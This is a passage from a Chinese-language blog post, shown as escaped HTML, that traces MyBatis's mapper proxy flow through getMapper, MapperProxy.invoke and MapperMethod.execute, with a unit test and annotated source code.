&lt;span class="c1">// issue #482
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">//如果是STATEMENT，清本地缓存
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">clearLocalCache&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">list&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>以上是&lt;code>SqlSession.selectOne&lt;/code>的流程。然而实际中我们直接使用SqlSession来执行数据库操作的情况很少。&lt;/p>
&lt;p>大多数情况我们会这样使用MyBatis:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java">&lt;span class="k">try&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">SqlSession&lt;/span> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sqlSessionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">openSession&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">BlogMapper&lt;/span> &lt;span class="n">mapper&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">BlogMapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">Blog&lt;/span> &lt;span class="n">blog&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">selectBlog&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">101&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个方法的详细过程我们使用MyBatis的单元测试来探索。&lt;/p>
&lt;p>单元测试代码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="nd">@Test&lt;/span>
&lt;span class="kd">public&lt;/span> &lt;span class="kt">void&lt;/span> &lt;span class="nf">shouldSelectBlogWithPostsUsingSubSelect&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">Exception&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">SqlSession&lt;/span> &lt;span class="n">session&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sqlSessionFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">openSession&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">BoundBlogMapper&lt;/span> &lt;span class="n">mapper&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">BoundBlogMapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">Blog&lt;/span> &lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mapper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">selectBlogWithPostsUsingSubSelect&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">assertEquals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getId&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">close&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="n">assertNotNull&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getAuthor&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="n">assertEquals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">101&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getAuthor&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">getId&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="n">assertEquals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;jim&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getAuthor&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">getUsername&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="n">assertEquals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;********&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getAuthor&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">getPassword&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="n">assertEquals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getPosts&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">size&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">close&lt;/span>&lt;span class="o">();&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>快进到&lt;code>session.getMapper&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="c1">//返回代理类
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">T&lt;/span> &lt;span class="nf">getMapper&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Class&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">type&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">SqlSession&lt;/span> &lt;span class="n">sqlSession&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 直接得到该类型Mapper代理工厂
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">MapperProxyFactory&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">mapperProxyFactory&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">MapperProxyFactory&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;)&lt;/span> &lt;span class="n">knownMappers&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">get&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">type&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// 没有就离谱
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">mapperProxyFactory&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">BindingException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Type &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">type&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34; is not known to the MapperRegistry.&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 通过当前Session生产一个代理
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">mapperProxyFactory&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">newInstance&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Exception&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">BindingException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Error getting mapper instance. Cause: &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>实际上生产Mapper的逻辑并不多。&lt;/p>
&lt;p>主要是执行代理方法时的动作。&lt;/p>
&lt;p>执行&lt;code>mapper.selectBlogWithPostsUsingSubSelect(1);&lt;/code>的逻辑如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="c1">// 由于是代理生成的，所以调用方法后会进入一下逻辑：
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nd">@Override&lt;/span>
&lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span> &lt;span class="n">proxy&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Method&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="kd">throws&lt;/span> &lt;span class="n">Throwable&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 如果这个方法是来自Object，就直接执行，直接返回
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Object&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">class&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">equals&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getDeclaringClass&lt;/span>&lt;span class="o">()))&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">try&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">invoke&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">Throwable&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="n">ExceptionUtil&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">unwrapThrowable&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">// 去缓存中找MapperMethod，第一次的话会new一个
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="n">MapperMethod&lt;/span> &lt;span class="n">mapperMethod&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cachedMapperMethod&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">//执行本体
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">mapperMethod&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">execute&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>下面就是整个代理的执行数据库操作的逻辑，比较长：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-Java" data-lang="Java"> &lt;span class="kd">public&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="nf">execute&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">SqlSession&lt;/span> &lt;span class="n">sqlSession&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Object&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">Object&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="c1">//可以看到执行时就是4种情况，insert|update|delete|select，分别调用SqlSession的4大类方法
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">SqlCommandType&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">INSERT&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getType&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">Object&lt;/span> &lt;span class="n">param&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">convertArgsToSqlCommandParam&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rowCountResult&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">insert&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">));&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">SqlCommandType&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">UPDATE&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getType&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">Object&lt;/span> &lt;span class="n">param&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">convertArgsToSqlCommandParam&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rowCountResult&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">update&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">));&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">SqlCommandType&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">DELETE&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getType&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="n">Object&lt;/span> &lt;span class="n">param&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">convertArgsToSqlCommandParam&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">rowCountResult&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">delete&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">));&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">SqlCommandType&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">SELECT&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getType&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 我们执行的是查询，直接跳到这里
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">returnsVoid&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">hasResultHandler&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">// 检查是不是没有返回值以及结果处理器: 我们执行的是查询，是有返回值的
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">executeWithResultHandler&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">;&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">returnsMany&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果结果有多条记录：我们只查一条
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">executeForMany&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">returnsMap&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//如果结果是map：我们查的只是个对象
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">executeForMap&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">sqlSession&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="c1">//否则就是一条记录
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 我们仔细分析这个convertArgsToSqlCommandParam方法
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">Object&lt;/span> &lt;span class="n">param&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">method&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">convertArgsToSqlCommandParam&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="c1">// 之后我们又回到了SelectOne这个方法。
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sqlSession&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">selectOne&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">(),&lt;/span> &lt;span class="n">param&lt;/span>&lt;span class="o">);&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="o">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="o">{&lt;/span>
&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">BindingException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Unknown execution method for: &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getName&lt;/span>&lt;span class="o">());&lt;/span>
&lt;span class="o">}&lt;/span>
